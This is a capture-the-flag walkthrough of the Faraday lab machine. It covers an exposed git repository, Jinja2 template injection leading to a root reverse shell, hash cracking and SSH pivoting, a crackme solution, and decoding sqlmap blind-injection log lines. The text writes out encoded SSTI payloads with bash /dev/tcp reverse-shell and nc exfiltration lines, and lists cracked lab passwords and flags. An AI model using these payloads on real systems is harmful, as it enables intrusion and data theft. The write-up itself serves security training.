# Nmap
```
# Nmap 7.95 scan initiated Thu Jul 31 18:16:59 2025 as: /usr/lib/nmap/nmap --privileged -sC -sV -Pn -oN ./nmap.txt 10.13.37.14
Nmap scan report for 10.13.37.14
Host is up (0.23s latency).
Not shown: 997 closed tcp ports (reset)
PORT     STATE SERVICE         VERSION
22/tcp   open  ssh             OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 a8:05:53:ae:b1:8d:7e:90:f1:ea:81:6b:18:f6:5a:68 (RSA)
|   256 2e:7f:96:ec:c9:35:df:0a:cb:63:73:26:7c:15:9d:f5 (ECDSA)
|_  256 2f:ab:d4:f5:48:45:10:d2:3c:4e:55:ce:82:9e:22:3a (ED25519)
80/tcp   open  http            nginx 1.13.12
| http-title: Notifications
|_Requested resource was http://10.13.37.14/login?next=%2F
| http-git: 
|   10.13.37.14:80/.git/
|     Git repository found!
|     .git/config matched patterns 'user'
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|_    Last commit message: Add app logic & requirements.txt 
|_http-server-header: nginx/1.13.12
8888/tcp open  sun-answerbook?
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, JavaRMI, Kerberos, LDAPBindReq, LDAPSearchReq, LPDString, LSCP, RPCCheck, RTSPRequest, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServerCookie, X11Probe: 
|     Welcome to FaradaySEC stats!!!
|     Username: Bad chars detected!
|   NULL: 
|     Welcome to FaradaySEC stats!!!
|_    Username:
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8888-TCP:V=7.95%I=7%D=7/31%Time=688BB32E%P=aarch64-unknown-linux-gn
SF:u%r(NULL,29,"Welcome\x20to\x20FaradaySEC\x20stats!!!\nUsername:\x20")%r
SF:(GetRequest,3C,"Welcome\x20to\x20FaradaySEC\x20stats!!!\nUsername:\x20B
SF:ad\x20chars\x20detected!")%r(HTTPOptions,3C,"Welcome\x20to\x20FaradaySE
SF:C\x20stats!!!\nUsername:\x20Bad\x20chars\x20detected!")%r(FourOhFourReq
SF:uest,3C,"Welcome\x20to\x20FaradaySEC\x20stats!!!\nUsername:\x20Bad\x20c
SF:hars\x20detected!")%r(JavaRMI,3C,"Welcome\x20to\x20FaradaySEC\x20stats!
SF:!!\nUsername:\x20Bad\x20chars\x20detected!")%r(LSCP,3C,"Welcome\x20to\x
SF:20FaradaySEC\x20stats!!!\nUsername:\x20Bad\x20chars\x20detected!")%r(Ge
SF:nericLines,3C,"Welcome\x20to\x20FaradaySEC\x20stats!!!\nUsername:\x20Ba
SF:d\x20chars\x20detected!")%r(RTSPRequest,3C,"Welcome\x20to\x20FaradaySEC
SF:\x20stats!!!\nUsername:\x20Bad\x20chars\x20detected!")%r(RPCCheck,3C,"W
SF:elcome\x20to\x20FaradaySEC\x20stats!!!\nUsername:\x20Bad\x20chars\x20de
SF:tected!")%r(DNSVersionBindReqTCP,3C,"Welcome\x20to\x20FaradaySEC\x20sta
SF:ts!!!\nUsername:\x20Bad\x20chars\x20detected!")%r(DNSStatusRequestTCP,3
SF:C,"Welcome\x20to\x20FaradaySEC\x20stats!!!\nUsername:\x20Bad\x20chars\x
SF:20detected!")%r(Help,3C,"Welcome\x20to\x20FaradaySEC\x20stats!!!\nUsern
SF:ame:\x20Bad\x20chars\x20detected!")%r(SSLSessionReq,3C,"Welcome\x20to\x
SF:20FaradaySEC\x20stats!!!\nUsername:\x20Bad\x20chars\x20detected!")%r(Te
SF:rminalServerCookie,3C,"Welcome\x20to\x20FaradaySEC\x20stats!!!\nUsernam
SF:e:\x20Bad\x20chars\x20detected!")%r(TLSSessionReq,3C,"Welcome\x20to\x20
SF:FaradaySEC\x20stats!!!\nUsername:\x20Bad\x20chars\x20detected!")%r(Kerb
SF:eros,3C,"Welcome\x20to\x20FaradaySEC\x20stats!!!\nUsername:\x20Bad\x20c
SF:hars\x20detected!")%r(SMBProgNeg,3C,"Welcome\x20to\x20FaradaySEC\x20sta
SF:ts!!!\nUsername:\x20Bad\x20chars\x20detected!")%r(X11Probe,3C,"Welcome\
SF:x20to\x20FaradaySEC\x20stats!!!\nUsername:\x20Bad\x20chars\x20detected!
SF:")%r(LPDString,3C,"Welcome\x20to\x20FaradaySEC\x20stats!!!\nUsername:\x
SF:20Bad\x20chars\x20detected!")%r(LDAPSearchReq,3C,"Welcome\x20to\x20Fara
SF:daySEC\x20stats!!!\nUsername:\x20Bad\x20chars\x20detected!")%r(LDAPBind
SF:Req,3C,"Welcome\x20to\x20FaradaySEC\x20stats!!!\nUsername:\x20Bad\x20ch
SF:ars\x20detected!");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Jul 31 18:17:44 2025 -- 1 IP address (1 host up) scanned in 45.20 seconds
```

# Page check
**login page**
![](images/Pasted%20image%2020250731182001.png)
We don't have any default credit, we can try to create one

**signup page**
![](images/Pasted%20image%2020250731182104.png)
Then we can access to the configuration page
![](images/Pasted%20image%2020250731182134.png)
After set our own config, then we can see who we can send the email to
![](images/Pasted%20image%2020250731182431.png)
![](images/Pasted%20image%2020250731182244.png)
To make sure the process is simple, i will only send the test message here
![](images/Pasted%20image%2020250731182526.png)

If we want to get the received email, we have to start the mail server on our local machine.
```
python3 -m smtpd -c DebuggingServer -n 10.10.14.5:25  
```

When we send the message from the web page, we can receive the email back
```
┌──(wither㉿localhost)-[~/Templates/htb-labs/Faraday/dump]
└─$ python3 -m aiosmtpd -n -l 0.0.0.0:1025
---------- MESSAGE FOLLOWS ----------
Subject: test
X-Peer: ('10.13.37.14', 42554)

An event was reported at JohnConnor:
test
Here is your gift FARADAY{ehlo_@nd_w3lcom3!}
------------ END MESSAGE ------------
```

# Dump git depository
We have known there is a `.git` from `nmap`
```
80/tcp   open  http            nginx 1.13.12
| http-title: Notifications
|_Requested resource was http://10.13.37.14/login?next=%2F
| http-git: 
|   10.13.37.14:80/.git/
|     Git repository found!
|     .git/config matched patterns 'user'
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|_    Last commit message: Add app logic & requirements.txt 
|_http-server-header: nginx/1.13.12
```

We can use `git-dumper` to get the depository
```
┌──(wither㉿localhost)-[~/Templates/htb-labs/Faraday]
└─$ git-dumper http://10.13.37.14/.git/ dump
```

After view the source code of `app.py`, I found some vulnerable functions
```
@app.route('/sendMessage', methods=['POST', 'GET'])
@login_required
def sendMessage():
    if request.method == "POST":
        if current_user.config and current_user.message:
            smtp = current_user.config[0]
            message = current_user.message[0]
            message.dest = request.form['dest']
            message.subject = request.form['subject']
            message.body =  "Subject: %s\r\n" % message.subject + render_template_string(template.replace('SERVER', message.server), message=request.form['body'], tinyflag=os.environ['TINYFLAG'])
            db.session.commit()
            try:
                server = smtplib.SMTP(host=smtp.host, port=smtp.port)
                if smtp.smtp_username != '':
                    server.login(smtp.smtp_username, smtp.smtp_password)
                server.sendmail('no-reply@faradaysec.com', message.dest, message.body)
                server.quit()
            except:
                return render_template('bad-connection.html')
        elif not current_user.config:
            return redirect('/configuration')
        else:
            return redirect('/profile')
    
    return render_template('sender.html')

@app.route('/profile')
@login_required
def profile():
    name = request.args.get('name', '')
    if name:
        if not current_user.message:
            message = MessageModel(server=name, user_id=current_user.id)
            db.session.add(message)
            db.session.commit()
        else:
            current_user.message[0].server = name
            db.session.commit()
        return redirect('/sendMessage')

    return render_template('base.html')
```

# Command injection
There is command injection here
```
❗【Command Injection / Template Injection】: render_template_string(template.replace(...), ...)

message.body = "Subject: %s\r\n" % message.subject + render_template_string(template.replace('SERVER', message.server), message=request.form['body'], tinyflag=os.environ['TINYFLAG'])

Issue:
You used render_template_string() and passed request.form['body'] as a Jinja2 template variable—this is user-controllable input.

Danger:
This can lead to a Server-Side Template Injection (SSTI) vulnerability. An attacker can craft a payload such as:
{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}

This can directly execute system commands, leading to Remote Command Execution (RCE).
```

Let's try to test it and exploit it.

Firstly, I would try the payload 
```
http://10.13.37.14/profile?name={{7*7}}  
```
Then we found `{{` has been removed
```
---------- MESSAGE FOLLOWS ----------
Subject: test
X-Peer: ('10.13.37.14', 42650)

An event was reported at 7*7}}:
test
Here is your gift FARADAY{ehlo_@nd_w3lcom3!}
------------ END MESSAGE ------------

```

Let's follow the blog page, there are different way to bypass it.
`https://www.onsecurity.io/blog/server-side-template-injection-with-jinja2/`
We can try this example here
```
{% if request['application']['__globals__']['__builtins__']['__import__']('os')['popen']('cat /etc/passwd | nc HOSTNAME 1337')['read']() == 'chiv' %} a {% endif %}
```

So our payload would be
```
{% if request['application']['__globals__']['__builtins__']['__import__']('os')['popen']('bash -c "bash -i >& /dev/tcp/10.10.14.5/443 0>&1"')['read']() == 'chiv' %} a {% endif %}  
```
We need to `urlencode` our payload like this 
```
http://10.13.37.14/profile?name={%25+if+request['application']['__globals__']['__builtins__']['__import__']('os')['popen']('bash+-c+"bash+-i+>%26+/dev/tcp/10.10.14.5/443+0>%261"')['read']()+%3d%3d+'chiv'+%25}+a+{%25+endif+%25}  
```

After send the message, we can get the reverse shell as `root`
```
┌──(wither㉿localhost)-[~/Templates/htb-labs/Faraday/dump]
└─$ nc -lnvp 443 
listening on [any] 443 ...
connect to [10.10.14.5] from (UNKNOWN) [10.13.37.14] 59534
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
root@98aa0f47eb96:/app# id
id
uid=0(root) gid=0(root) groups=0(root)
root@98aa0f47eb96:/app# whoami
whoami
root
root@98aa0f47eb96:/app# 
```

Let's upgrade our shell firstly
```
python3 -c 'import pty;pty.spawn("bash")'
^Z
stty raw -echo; fg
```

From the `/app` directory, we can get the flag and a database directory
```
root@98aa0f47eb96:/app# cat flag.txt 
FARADAY{7x7_1s_n0t_@lw4ys_49}
root@98aa0f47eb96:/app# ls -al
total 56
drwxr-xr-x 1 root root 4096 Jul 28 15:04 .
drwxr-xr-x 1 root root 4096 Jul 21  2021 ..
drwxr-xr-x 8 root root 4096 Jul 16  2021 .git
drwxr-xr-x 2 root root 4096 Jul 21  2021 __pycache__
-rwxr-xr-x 1 root root 8523 Jul 21  2021 app.py
drwxr-xr-x 2 root root 4096 Jul 31 08:53 db
-rw-r--r-- 1 root root   30 Jul 16  2021 flag.txt
-rw-r--r-- 1 root root  220 Jul 16  2021 requirements.txt
drwxr-xr-x 1 root root 4096 Jul 28 15:05 static
drwxr-xr-x 2 root root 4096 Jul 21  2021 templates
-rw-r--r-- 1 root root   71 Jul 16  2021 wsgi.py

root@98aa0f47eb96:/app/db# ls
database.db 

root@98aa0f47eb96:/app/db# sqlite3 database.db
bash: sqlite3: command not found
```

I try to use `sqlite3`, but in this machine, did not have.So we have to send it to our local machine
```
root@98aa0f47eb96:/app/db# cat database.db >& /dev/tcp/10.10.14.5/4444 0>&1
```
Remember to use `nc` to handle it 
```
nc -lnvp 4444 > database.db
```
Then we can check the database
```
┌──(wither㉿localhost)-[~/Templates/htb-labs/Faraday/dump]
└─$ sqlite3 database.db                                                      
SQLite version 3.46.1 2024-08-13 09:16:08
Enter ".help" for usage hints.
sqlite> .tables
message_model  smtp_config    user_model   
sqlite> select * from user_model;
1|admin@faradaysec.com|administrator|sha256$GqgROghu45Dw4D8Z$5a7eee71208e1e3a9e3cc271ad0fd31fec133375587dc6ac1d29d26494c3a20f
2|octo@faradaysec.com|octo|sha256$gqsmQ2210dEMufAk$98423cb07f845f263405de55edb3fa9eb09ada73219380600fc98c54cd700258
3|pasta@faradaysec.com|pasta|sha256$MsbGKnO1PaFa3jhV$6b166f7f0066a96e7565a81b8e27b979ca3702fdb1a80cef0a1382046ed5e023
4|root@faradaysec.com|root|sha256$L2eaiLgdT73AvPij$dc98c1e290b1ec3b9b8f417a553f2abd42b94694e2a62037e4f98d622c182337
5|pepe@gmail.com|pepe|sha256$9NzZrF4OtO9r0nFx$c3aa1b68bea55b4493d2ae96ec596176890c4ccb6dedf744be6f6bdbd652255d
6|nobody@gmail.com|nobody|sha256$E2bUlSPGhOi2f5Mi$2982efbc094ed13f7169477df7c078b429f60fe2155541665f6f41ef42cd91a1
7|ryan@gmail.com|bunnys666|sha256$hsrR9iBsV2EqE0nz$7755c4d10a780afbeb9909182dbe6f9dc3026f8ea5869a4405cc8f72fbaabe10
8|email@test.com|email|sha256$cEUaaRws6KSpd1ui$a80e816414213496b285b1e41115b9be2d69555ab870193e892ef940d03558cc
9|test@test.com|test|sha256$UdYjyDnSNSswOCXP$81a4815106657c57d958ecef66b5a6348c1aed0ce8ca4c64570ad55b5b32b8c2
10|wither@test.com|wither|sha256$5kH2MVQxZtQYAJhO$bd30f4d7142803ad2c6a3a50428945e82bb7ace39197b4dd0f694381d90341a9
sqlite> 
```
Then we can use `hashcat` to crack the password of them
```
pasta:antihacker
pepe:sarmiento
administrator:ihatepasta  
octo:octopass
test:test
```

By checking the `ip` address, we can found we are in the docker environment
```
root@98aa0f47eb96:~# ip a 
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
5: eth0@if6: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
    link/ether 02:42:ac:16:00:02 brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet 172.22.0.2/16 brd 172.22.255.255 scope global eth0
       valid_lft forever preferred_lft forever

```

# shell as pasta
By using the credits we have before, `pasta:antihacker` could use ssh to connect
```
-bash-5.0$ whoami
pasta
-bash-5.0$ id
uid=1001(pasta) gid=1001(pasta) groups=1001(pasta)
-bash-5.0$ ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: ens160: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
    link/ether 00:50:56:b0:b6:0d brd ff:ff:ff:ff:ff:ff
    inet 10.13.37.14/24 brd 10.13.37.255 scope global ens160
       valid_lft forever preferred_lft forever
    inet6 dead:beef::250:56ff:feb0:b60d/64 scope global dynamic mngtmpaddr 
       valid_lft 86393sec preferred_lft 14393sec
    inet6 fe80::250:56ff:feb0:b60d/64 scope link 
       valid_lft forever preferred_lft forever
3: br-60af0c740c74: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
    link/ether 02:42:e2:18:ac:b8 brd ff:ff:ff:ff:ff:ff
    inet 172.22.0.1/16 brd 172.22.255.255 scope global br-60af0c740c74
       valid_lft forever preferred_lft forever
    inet6 fe80::42:e2ff:fe18:acb8/64 scope link 
       valid_lft forever preferred_lft forever
4: docker0: <NO-CARRIER,BROADCAST,MULTICAST,UP> mtu 1500 qdisc noqueue state DOWN group default 
    link/ether 02:42:e8:93:7e:c9 brd ff:ff:ff:ff:ff:ff
    inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0
       valid_lft forever preferred_lft forever
6: veth049195d@if5: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue master br-60af0c740c74 state UP group default 
    link/ether c6:69:2a:6c:e7:7d brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet6 fe80::c469:2aff:fe6c:e77d/64 scope link 
       valid_lft forever preferred_lft forever
8: veth5f7e597@if7: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue master br-60af0c740c74 state UP group default 
    link/ether 82:32:44:89:bf:d7 brd ff:ff:ff:ff:ff:ff link-netnsid 1
    inet6 fe80::8032:44ff:fe89:bfd7/64 scope link 
       valid_lft forever preferred_lft forever
```

There is a file `crackme`in the home directory of `pasta`
```
-bash-5.0$ ls -al
total 48
drwxr-xr-x 3 pasta pasta  4096 Sep 14  2021 .
drwxr-xr-x 5 root  root   4096 Jul 20  2021 ..
lrwxrwxrwx 1 root  root      9 Sep 14  2021 .bash_history -> /dev/null
-rw-r--r-- 1 pasta pasta   220 Jul 20  2021 .bash_logout
-rw-r--r-- 1 pasta pasta  3808 Jul 22  2021 .bashrc
drwx------ 2 pasta pasta  4096 Jul 20  2021 .cache
-rwxr-xr-x 1 pasta pasta 16968 Jul 16  2021 crackme
-rw-r--r-- 1 pasta pasta   807 Jul 20  2021 .profile
-rw-r--r-- 1 pasta pasta    65 Jul 22  2021 .pythonrc

-bash-5.0$ file crackme 
crackme: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=f0fa1af64ecc4ee7971bc714797d07ee45b21c06, for GNU/Linux 3.2.0, not stripped
```

Let's download it to our local machine
```
-bash-5.0$ python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.14.5 - - [31/Jul/2025 09:07:59] "GET /crackme HTTP/1.1" 200 -

┌──(wither㉿localhost)-[~/Templates/htb-labs/Faraday/dump]
└─$ wget http://10.13.37.14:8000/crackme                                                                                                     
--2025-07-31 19:02:47--  http://10.13.37.14:8000/crackme
Connecting to 10.13.37.14:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 16968 (17K) [application/octet-stream]
Saving to: ‘crackme’

crackme                                     100%[===========================================================================================>]  16.57K  65.4KB/s    in 0.3s    

2025-07-31 19:02:48 (65.4 KB/s) - ‘crackme’ saved [16968/16968]

```

Then we can use `ghidra` to `decompile` it
There are something interesting from main function
```
int __fastcall main(int argc, const char **argv, const char **envp)
{
  char input; // al
  double result; // xmm0_8
  double y; // [rsp+10h] [rbp-48h]
  double x; // [rsp+18h] [rbp-40h]
  __int128 part1; // [rsp+20h] [rbp-38h] BYREF
  __int64 part2; // [rsp+30h] [rbp-28h]
  double part3; // [rsp+38h] [rbp-20h]
  unsigned __int64 stack_cookie; // [rsp+48h] [rbp-10h]

  stack_cookie = __readfsqword(0x28u);
  __printf_chk(1LL, "Insert flag: ", envp);
  __isoc99_scanf("%32s", &part1);
  input = BYTE3(part3);
  HIWORD(part2) = __ROL2__(HIWORD(part2), 8);
  BYTE3(part3) = HIBYTE(part3);
  HIBYTE(part3) = input;
  if ( part1 == __PAIR128__('@_3lbu0d', '{YADARAF') && LOBYTE(part3) == '_' && part2 == '@to1f_dn' )  
  {
    y = part3;
    x = *((double *)&part1 + 1);
    __printf_chk(1LL, "x: %.30lf\n", *((double *)&part1 + 1));
    __printf_chk(1LL, "y: %.30lf\n", COERCE_DOUBLE('@to1f_dn'));
    __printf_chk(1LL, "z: %.30lf\n", y);
    result = x * 326.9495605207693 * (x * 326.9495605207693) / y;
    round_double(result, 30);
    __printf_chk(1LL, "%.30lf\n", result);
    round_double(result, 30);
    if ( fabs(result - 4088116.817143337) >= 0.0000001192092895507812 )
      puts("Try Again");
    else
      puts("Well done!");
  }
  if ( __readfsqword(0x28u) != stack_cookie )
    start();
  return 0;
}
```

We get the part of flag is `FARADAY{d0ubl3_@nd_f1o@t_ `
What we can do is to force crack the possible characters with double bytes as `_` and characters 3 and 7 swapped until the condition is met
```
#!/usr/bin/python3
from itertools import product
import struct, string

flag = "FARADAY{d0ubl3_@nd_f1o@t_"

characters = string.ascii_lowercase + string.punctuation

for combination in product(characters, repeat=5):
    chars = "".join(combination).encode()
    value = b"_" + chars[:2] + b"}" + chars[2:] + b"@"
    result = 1665002837.488342 / struct.unpack("d", value)[0]

    if abs(result - 4088116.817143337) <= 0.0000001192092895507812:  
        value = chars[:2] + b"@" + chars[2:] + b"}"
        print(flag + value.decode())
        break
```

Then we can get the whole flag
```
┌──(wither㉿localhost)-[~/Templates/htb-labs/Faraday/dump]
└─$ python3 crack.py                                                       
FARADAY{d0ubl3_@nd_f1o@t_be@uty}
```

# shell as administrator
Let's continue to try the ssh credits, we can find `administrator:ihatepasta` also matched
```
-bash-5.0$ id
uid=1000(administrator) gid=1000(administrator) groups=1000(administrator)
-bash-5.0$ whoami
administrator
-bash-5.0$ ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: ens160: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
    link/ether 00:50:56:b0:b6:0d brd ff:ff:ff:ff:ff:ff
    inet 10.13.37.14/24 brd 10.13.37.255 scope global ens160
       valid_lft forever preferred_lft forever
    inet6 dead:beef::250:56ff:feb0:b60d/64 scope global dynamic mngtmpaddr 
       valid_lft 86395sec preferred_lft 14395sec
    inet6 fe80::250:56ff:feb0:b60d/64 scope link 
       valid_lft forever preferred_lft forever
3: br-60af0c740c74: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
    link/ether 02:42:e2:18:ac:b8 brd ff:ff:ff:ff:ff:ff
    inet 172.22.0.1/16 brd 172.22.255.255 scope global br-60af0c740c74
       valid_lft forever preferred_lft forever
    inet6 fe80::42:e2ff:fe18:acb8/64 scope link 
       valid_lft forever preferred_lft forever
4: docker0: <NO-CARRIER,BROADCAST,MULTICAST,UP> mtu 1500 qdisc noqueue state DOWN group default 
    link/ether 02:42:e8:93:7e:c9 brd ff:ff:ff:ff:ff:ff
    inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0
       valid_lft forever preferred_lft forever
6: veth049195d@if5: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue master br-60af0c740c74 state UP group default 
    link/ether c6:69:2a:6c:e7:7d brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet6 fe80::c469:2aff:fe6c:e77d/64 scope link 
       valid_lft forever preferred_lft forever
8: veth5f7e597@if7: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue master br-60af0c740c74 state UP group default 
    link/ether 82:32:44:89:bf:d7 brd ff:ff:ff:ff:ff:ff link-netnsid 1
    inet6 fe80::8032:44ff:fe89:bfd7/64 scope link 
       valid_lft forever preferred_lft forever
```

I did not found something useful from the home directory of `administrator`

So I would check something only `administrator` can check
```
-bash-5.0$ hostname -I
10.13.37.14 172.22.0.1 172.17.0.1 dead:beef::250:56ff:feb0:b60d 
-bash-5.0$ find / -user administrator 2>/dev/null | grep -vE "/proc|/sys|/home|/run"  
/dev/pts/1
/var/mail/administrator
/var/log/apache2/access.log
```

After simply filter, i found something not usual liked `sqlmap` messages
```
-bash-5.0$ cat /var/log/apache2/access.log | grep sqlmap | head -n4
4969 192.168.86.1 - - [20/Jul/2021:00:00:00 -0700] "GET /update.php?keyword=python%27%20WHERE%201388%3D1388%20AND%20%28SELECT%207036%20FROM%20%28SELECT%28SLEEP%283-%28IF%28ORD%28MID%28%28SELECT%20IFNULL%28CAST%28table_name%20AS%20NCHAR%29%2C0x20%29%20FROM%20INFORMATION_SCHEMA.TABLES%20WHERE%20table_schema%3D0x6d7973716c%20LIMIT%2028%2C1%29%2C3%2C1%29%29%3E110%2C0%2C3%29%29%29%29%29pqBK%29--%20EZas&text=python3 HTTP/1.1" 200 327 "http://192.168.86.128:80/update.php" "sqlmap/1.5.7.4#dev (http://sqlmap.org)"
4128 192.168.86.1 - - [20/Jul/2021:00:00:00 -0700] "GET /update.php?keyword=python%27%20WHERE%201388%3D1388%20AND%20%28SELECT%207036%20FROM%20%28SELECT%28SLEEP%283-%28IF%28ORD%28MID%28%28SELECT%20IFNULL%28CAST%28table_name%20AS%20NCHAR%29%2C0x20%29%20FROM%20INFORMATION_SCHEMA.TABLES%20WHERE%20table_schema%3D0x6d7973716c%20LIMIT%2028%2C1%29%2C3%2C1%29%29%3E111%2C0%2C3%29%29%29%29%29pqBK%29--%20EZas&text=python3 HTTP/1.1" 200 327 "http://192.168.86.128:80/update.php" "sqlmap/1.5.7.4#dev (http://sqlmap.org)"
3003908 192.168.86.1 - - [20/Jul/2021:00:00:00 -0700] "GET /update.php?keyword=python%27%20WHERE%201388%3D1388%20AND%20%28SELECT%207036%20FROM%20%28SELECT%28SLEEP%283-%28IF%28ORD%28MID%28%28SELECT%20IFNULL%28CAST%28table_name%20AS%20NCHAR%29%2C0x20%29%20FROM%20INFORMATION_SCHEMA.TABLES%20WHERE%20table_schema%3D0x6d7973716c%20LIMIT%2028%2C1%29%2C3%2C1%29%29%21%3D111%2C0%2C3%29%29%29%29%29pqBK%29--%20EZas&text=python3 HTTP/1.1" 200 327 "http://192.168.86.128:80/update.php" "sqlmap/1.5.7.4#dev (http://sqlmap.org)"
3003605 192.168.86.1 - - [20/Jul/2021:00:00:04 -0700] "GET /update.php?keyword=python%27%20WHERE%201388%3D1388%20AND%20%28SELECT%207036%20FROM%20%28SELECT%28SLEEP%283-%28IF%28ORD%28MID%28%28SELECT%20IFNULL%28CAST%28table_name%20AS%20NCHAR%29%2C0x20%29%20FROM%20INFORMATION_SCHEMA.TABLES%20WHERE%20table_schema%3D0x6d7973716c%20LIMIT%2028%2C1%29%2C3%2C1%29%29%3E96%2C0%2C3%29%29%29%29%29pqBK%29--%20EZas&text=python3 HTTP/1.1" 200 327 "http://192.168.86.128:80/update.php" "sqlmap/1.5.7.4#dev (http://sqlmap.org)"
```
After` url-decode` them, I get
```
-bash-5.0$ cat /var/log/apache2/access.log | grep sqlmap | head -n4
4969 192.168.86.1 - - [20/Jul/2021:00:00:00 -0700] "GET /update.php?keyword=python' WHERE 1388=1388 AND (SELECT 7036 FROM (SELECT(SLEEP(3-(IF(ORD(MID((SELECT IFNULL(CAST(table_name AS NCHAR),0x20) FROM INFORMATION_SCHEMA.TABLES WHERE table_schema=0x6d7973716c LIMIT 28,1),3,1))>110,0,3)))))pqBK)-- EZas&text=python3 HTTP/1.1" 200 327 "http://192.168.86.128:80/update.php" "sqlmap/1.5.7.4#dev (http://sqlmap.org)"
4128 192.168.86.1 - - [20/Jul/2021:00:00:00 -0700] "GET /update.php?keyword=python' WHERE 1388=1388 AND (SELECT 7036 FROM (SELECT(SLEEP(3-(IF(ORD(MID((SELECT IFNULL(CAST(table_name AS NCHAR),0x20) FROM INFORMATION_SCHEMA.TABLES WHERE table_schema=0x6d7973716c LIMIT 28,1),3,1))>111,0,3)))))pqBK)-- EZas&text=python3 HTTP/1.1" 200 327 "http://192.168.86.128:80/update.php" "sqlmap/1.5.7.4#dev (http://sqlmap.org)"
3003908 192.168.86.1 - - [20/Jul/2021:00:00:00 -0700] "GET /update.php?keyword=python' WHERE 1388=1388 AND (SELECT 7036 FROM (SELECT(SLEEP(3-(IF(ORD(MID((SELECT IFNULL(CAST(table_name AS NCHAR),0x20) FROM INFORMATION_SCHEMA.TABLES WHERE table_schema=0x6d7973716c LIMIT 28,1),3,1))!=111,0,3)))))pqBK)-- EZas&text=python3 HTTP/1.1" 200 327 "http://192.168.86.128:80/update.php" "sqlmap/1.5.7.4#dev (http://sqlmap.org)"
3003605 192.168.86.1 - - [20/Jul/2021:00:00:04 -0700] "GET /update.php?keyword=python' WHERE 1388=1388 AND (SELECT 7036 FROM (SELECT(SLEEP(3-(IF(ORD(MID((SELECT IFNULL(CAST(table_name AS NCHAR),0x20) FROM INFORMATION_SCHEMA.TABLES WHERE table_schema=0x6d7973716c LIMIT 28,1),3,1))>96,0,3)))))pqBK)-- EZas&text=python3 HTTP/1.1" 200 327 "http://192.168.86.128:80/update.php" "sqlmap/1.5.7.4#dev (http://sqlmap.org)"
```

There are so many messages like that, and there seems like some patterns and rules like
```
28,1),3,1))>110,0,3)))))pqBK)
28,1),3,1))>111,0,3)))))pqBK)
28,1),3,1))!=111,0,3)))))pqBK)--
28,1),3,1))!=111,0,3)))))pqBK)--
28,1),3,1))>96,0,3)))))pqBK)-
```

What we have to do is to `urldecode` the lines and then use `chr` to convert each decimal into readable text.
```
#!/usr/bin/python3
import re, urllib.parse

with open("/var/log/apache2/access.log") as file:  
    for line in file:
        line = urllib.parse.unquote(line)
        if not "update.php" in line:
            continue
        regex = re.search("\)\)!=(\d+)", line)
        if regex:
            decimal = int(regex.group(1))
            print(chr(decimal), end="")
```

Then we can find something useful
```
-bash-5.0$ python3 clear.py 
ome_zone_leap_secondnametransition_typeuser5avg_latencyeventsmax_latencytotaltotal_latency1414.85 uswait/io/file/sql/misc14.85 us114.85 us31.43 uswait/io/file/sql/pid50.48 us394.30 us71.32 uswait/io/file/mysys/charset160.53 us3213.97 us314.15 uswait/io/file/sql/ERRMSG1.39 ms51.57 ms314.15 uswait/io/file/sql/ERRMSG1.39 ms51.57 ms1.01 mswait/io/file/sql/casetest14.96 ms1515.11 ms53.56 uswait/io/file/sql/binlog_index1.57 ms392.09 ms137.83 uswait/io/file/sql/binlog2.25 ms435.93 ms284.55 uswait/io/file/innodb/innodb_temp_file1.32 ms14842.11 ms859.45 uswait/io/file/innodb/innodb_dblwr_file122.95 ms402544344434.57 s650.671715 uswait/io/file/innodb/innodb_data_file85.94 ms424058888827.55 s4.07 uswait/lock/table/sql/handler349.32 us4904896444199.773 ms859.715 uswaqit/io/file/innodb/innodb_log_file916.48 ms8808177131.26 min4.22 uswait/io/table/sql/handler1.33 